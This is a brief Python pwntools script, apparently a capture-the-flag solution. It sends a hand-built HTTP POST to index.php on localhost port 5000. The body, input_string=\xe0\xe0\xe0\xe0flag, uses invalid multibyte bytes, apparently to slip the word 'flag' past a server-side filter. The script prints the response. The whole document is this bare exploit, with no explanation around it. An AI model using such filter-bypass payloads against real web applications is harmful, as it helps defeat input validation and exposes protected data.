from pwn import *

ip = 'localhost'
port = 5000

connection = remote(ip, port)

data = b"input_string=\xe0\xe0\xe0\xe0flag"

headers = f"POST /index.php HTTP/1.1\r\n"
headers += f"Host: {ip}\r\n"
headers += "Content-Type: application/x-www-form-urlencoded\r\n"
headers += f"Content-Length: {len(data)}\r\n"
headers += "\r\n"

request = headers.encode() + data

connection.send(request)

response = connection.recv()
print(response.decode())

connection.close()
